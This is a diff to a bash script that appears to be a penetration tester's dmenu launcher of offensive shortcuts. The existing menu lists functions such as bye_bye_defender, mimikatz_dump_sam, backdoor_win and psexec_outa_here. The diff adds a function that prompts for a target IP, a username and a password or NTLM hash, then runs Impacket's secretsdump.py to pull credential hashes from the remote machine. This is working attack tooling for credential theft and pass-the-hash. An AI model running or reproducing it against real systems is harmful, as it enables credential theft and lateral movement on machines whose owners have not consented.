@@ -29,7 +29,8 @@ function ctrl() {
 function_meta=("bye_bye_defender" "Stabilise_reverse_shell" "Stabilise_reverse_shell3" \
 	"vim_hexdump_ascii" "vim_hexdump_binary" "meterpreter_proxychain" \
 	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp" "backdoor_win" \
-	"powershell_find_txt" "powershell_find_ps1" "sharphound_exe_collect" "at_exec_ma_boy" "psexec_outa_here")
+	"powershell_find_txt" "powershell_find_ps1" "sharphound_exe_collect" "at_exec_ma_boy" "psexec_outa_here" \
+	"secdump_over_the_air")
 
 # function that are needed
 function stabilize_rev_shell() {
@@ -157,6 +158,27 @@ function psexec_outa_here() {
 	fi
 }
 
+function secdump_over_the_air() {
+	form_data=$(zenity --forms --title="Enter Information" \
+	--text="Enter the following information:" \
+	--add-entry="IP Address" \
+	--add-entry="Username" \
+	--add-combo="Authentication Type" --combo-values="Password|Hash" \
+	--separator="|")
+	ip_address=$(echo "$form_data" | cut -d"|" -f1)
+	username=$(echo "$form_data" | cut -d"|" -f2)
+	auth_type=$(echo "$form_data" | cut -d"|" -f3)
+
+	password=$(zenity --password --title="enter $auth_type")
+
+	sleep 2
+	if [ $auth_type = "Hash" ]; then
+		command "secretsdump.py -hashes $password '${username}@$ip_address'"
+	else
+		command "secretsdump.py '${username}:${password}@$ip_address'"
+	fi
+}
+
 ret=$(echo ${function_meta[*]} | tr ' ' '\n' | dmenu "$@")
 
 
@@ -194,5 +216,7 @@ if [ ! -z $ret ]; then
 		at_exec_ma_boy
 	elif [ $ret = "psexec_outa_here" ]; then
 		psexec_outa_here
+	elif [ $ret = "secdump_over_the_air" ]; then
+		secdump_over_the_air
 	fi
 fi
